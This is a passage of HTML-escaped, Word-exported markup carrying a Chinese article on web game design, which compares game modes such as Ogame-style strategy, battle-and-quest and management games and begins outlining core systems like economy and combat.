style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;对玩家来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式模拟一个君主，发动一系列战争。满足君主的成就感。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：玩&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式的游戏需要足够的耐心。当然有钱也行。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;对开发者来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：有相当多的地方可以参考。甚至有源代码参考。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;(Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的源代码&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;)&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：不管名字怎么改，策划怎么策划。本质没有变化。换汤不换药，玩家不是傻子。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nOgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式所获得的成功，就像传奇刚出来的时候。不是因为这个模式非常好，而是因为暂时还没有更强的模式超过他。所以，如果你想做网页游戏赚钱，而不是好玩，或者仅仅为了架设一个自己的服务器。那么请从新开发一种新模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n2&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、游戏的核心就是战斗，不断的战斗，不断的完成任务。这里我简单的称为&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ebs&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比较优秀的代表：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;EBSII&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;web&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;幻想（&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;wog&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;），无心宠物（论坛插件）。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nEbs&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式也是成熟的模式。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;对玩家来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：只管不断的战斗，完成任务，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;PK&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：只能不断的战斗，完成任务，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;PK&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;对开发者来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：有相当多的地方可以参考。甚至有源代码参考。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n(wog&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;（&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt; web&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;幻想）的源代码，无心宠物的源代码&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;) &lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：收益到底如何呢？&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n3&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;mmRPG&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模式游戏。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;猫游记、英雄之门、昆仑（昆仑不应该算网页游戏了）。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;模拟具有客户端的网络游戏。本身这个想法非常好，但是，谁来玩是一个问题。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;对玩家来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：类似有客户端的网络游戏。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：画面、游戏性等等都比不过客户端网络游戏，要玩&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;mmrpg&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，有必要玩网页游戏吗？对开发者来说：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;优点：模式清晰，参考众多。（大部分网络游戏都可以作为参考）&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;缺点：策划难度高，技术难度高。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;4&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、经营模式游戏。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;武林足球经理、&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;XBA&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;篮球经理。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;经营类游戏在游戏消耗上，和成就感上比较难处理。毕竟不是单机的经营游戏。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;如果策划够强，经营类游戏是很好的选择。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:12.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;那么，作为开发者来说，选择哪一类入手呢？&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;从程序的角度上来说，不管哪一类，都需要六个系统。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;二、网页游戏六大系统&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、经济系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;经济系统包括：商店、拍卖行、生产或打工场所、道具和资源。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;生产或打工场所&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;通过&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;消耗时间&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;产生&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具和资源&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;商店&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;让玩家和系统进行&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具和资源&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;的交互。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;拍卖行&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;让玩家和玩家之间进行&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具和资源&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;的交互。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;b&gt;2&lt;/b&gt;&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、消耗系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;战斗、战争、比赛系统。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;)&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;不论是哪一类网页游戏。都是以下&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;12&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;个模式中选择某几个组合。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1 NPC&lt;br /&gt;\r\nN &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1 NPC&lt;br /&gt;\r\nN &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs N NPC&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nN &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1 &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;N &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs N &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1 NPC&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;N&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; 